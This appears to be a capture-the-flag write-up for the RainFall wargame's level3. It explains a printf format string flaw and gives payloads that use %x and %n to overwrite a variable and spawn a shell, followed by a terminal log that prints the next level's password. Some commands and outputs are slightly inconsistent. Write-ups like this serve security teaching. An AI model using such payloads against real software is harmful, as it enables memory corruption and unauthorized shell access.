### The Basic Idea
The program contains a **format string vulnerability** in a `printf()` function. The format string vulnerability is a well-known security flaw where we can control the input to `printf()` and use format specifiers (like `%x` or `%n`) to **read** or **write** arbitrary memory. The goal here is to modify the value of a global variable `m`, which is located at a known memory address, and set it to `64`. When `m` equals `64`, the program executes a `system()` call, which gives us shell access.

### 1. **Identifying the Vulnerability in `printf()`**

In the vulnerable program, `printf()` is called like this:
```c
printf(user_input);
```
Where `user_input` is the input the program takes from the user. This means that **we** control the format string passed to `printf()`. Normally, `printf()` expects a format string, but since the input comes from the user, we can insert special format specifiers like `%x`, `%n`, etc.

- **`%x`** prints values from the stack as hexadecimal integers.
- **`%n`** writes the number of characters printed so far to the memory address we specify.

This is a **dangerous vulnerability** because we can use `%x` to print memory values and `%n` to modify memory, which can allow us to overwrite variables like `m`!

### 2. **Using `%x` to Read Memory**

Our task is to locate the memory address of the global variable `m`, which is located at a known address (let's say `0x804988c`). The stack stores return addresses, function parameters, and other data, including the address of `m`. To find it, we use `%x`, which prints values from the stack.

#### Here’s what we do:
We run this command:
```bash
python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"' > /tmp/exploit3
cat /tmp/exploit3 | ./level3
```

#### Explanation:
- `"aaaa"` is our input string, which is printed first.
- The `%x` format specifier tells `printf()` to print a value from the stack in hexadecimal form.
- The stack contains values, and we print the first 10 stack values using `%x %x %x %x %x %x %x %x %x %x`.

The output might look like:
```
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
```

- The first printed value, `61616161`, is the **hexadecimal** representation of the ASCII string `"aaaa"`.
- Other values (`b7fd1ac0`, `b7ff37d0`) represent **memory addresses** from the stack.

We are interested in finding the address of `m`. After printing several `%x` values, we can find the address of `m` in the output, like this:

``` bash
(gdb) info variables m
Non-debugging symbols:
0x08049884  completed.6159
0x0804988c  m
(gdb)
```

```bash
python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit3
cat /tmp/exploit | ./level3
```

This might output:
```
200 b7fd1ac0 b7ff37d0 804988c
```

Now we see the address `0x804988c`, which is the address of `m`! This is the crucial step, as we've located the memory address of the global variable `m`.

### 3. **Overwriting the Value of `m`**

Now that we know the address of `m`, we need to **change** its value to `64` because the program has logic that checks if `m == 64` and then triggers a `system()` call (which gives us a shell). The `%n` format specifier allows us to **write** the number of characters printed so far to the specified memory address.

#### Steps to Modify `m`:
1. We know that `m` is located at `0x804988c`, so we use its address in little-endian format (`\x8c\x98\x04\x08`).
2. We pad the input string to make the total number of characters printed equal to `64`. This will ensure that when we use `%n`, it writes `64` to `m`.
3. We use `%n` to write the number of characters printed (which will be `64`) to the address of `m`.

Here's the exploit:
```bash
python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit3
cat /tmp/exploit3 | ./level3
```

#### Explanation:
- `"\x8c\x98\x04\x08"` is the address of `m` in little-endian format.
- `"A" * 60` pads the input string so that the total number of characters printed is `64`.
- `%4$n` tells `printf()` to write the number of characters printed so far (which is `64`) to the memory address we specified earlier (`m`).

### 4. **Gaining Shell Access**

Once `m` is set to `64`, the program checks if `m == 64`. If true, it prints `"Wait what?!"` and executes the `system()` function, which opens a shell for us.

#### Output:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
```

We successfully modified `m` to `64`, and the program triggers the `system()` call, launching a shell.

Now, we have a shell, and we can execute commands like `whoami` to confirm we are running as the `level4` user, and `cat /home/user/level4/.pass` to get the flag.

### Why This Works

1. **Format String Vulnerability**: The `printf()` function is vulnerable because it allows the attacker to inject format specifiers into the format string, allowing them to print values from memory and write to specific memory locations.

2. **Reading Memory (`%x`)**: By printing values from the stack with `%x`, we can read memory addresses and values, including the address of `m`.

3. **Writing to Memory (`%n`)**: The `%n` format specifier lets us write the number of characters printed so far to a specified address. This allows us to modify the value of `m`.

4. **Triggering the Shell**: By setting `m` to `64`, we cause the program to execute the `system()` call, which gives us a shell.

### Conclusion

This works because the `printf()` function doesn't sanitize the format string, so we can manipulate the program's stack to read and modify memory. By chaining the use of `%x` (to read the address of `m`) and `%n` (to overwrite `m`), we can control the flow of the program and execute the `system()` function, gaining access to a shell.


``` bash
level3@RainFall:~$ cat /tmp/exploit3 | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
level3@RainFall:~$ cat /tmp/exploit3 - | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
woami
/bin/sh: 1: woami: not found
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
su level4
su: must be run from a terminal
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa/bin/sh: 5: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa: not found
level3@RainFall:~$ su level4
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
level4@RainFall:~$
```